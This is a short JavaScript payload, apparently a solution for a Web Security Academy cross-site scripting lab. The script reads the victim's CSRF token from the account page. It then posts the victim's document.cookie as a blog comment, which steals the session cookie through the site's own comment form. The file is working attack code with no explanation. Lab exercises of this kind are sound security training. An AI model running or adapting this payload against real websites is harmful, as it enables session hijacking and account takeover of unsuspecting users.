function getCSRFToken(){
    var xhr = new XMLHttpRequest();
    var re = new RegExp('name="csrf" value="(.*)">');
    xhr.onreadystatechange = function() {
    if (xhr.readyState == XMLHttpRequest.DONE) {
                var csrfToken = xhr.responseText.match(re)[1];
                console.log(csrfToken)
                commentCookie(csrfToken);
        }
    }
    xhr.open('GET', 'https://ac351f1e1e3b39a9c026073a00c10065.web-security-academy.net/my-account', true);
    xhr.send(null);
}

function commentCookie(csrfToken){
    var http = new XMLHttpRequest();
    var params = 'csrf='+csrfToken+'&postId=2&comment='+document.cookie+'&name=VICTIM&email=victim@victim.com&website=https%3A%2F%2Fweb-security-academy.net%2Fpost%3FpostId%3D2'
    http.open('POST', 'https://ac351f1e1e3b39a9c026073a00c10065.web-security-academy.net/post/comment', true);
    http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
    http.send(params);
}

var csrfToken = getCSRFToken();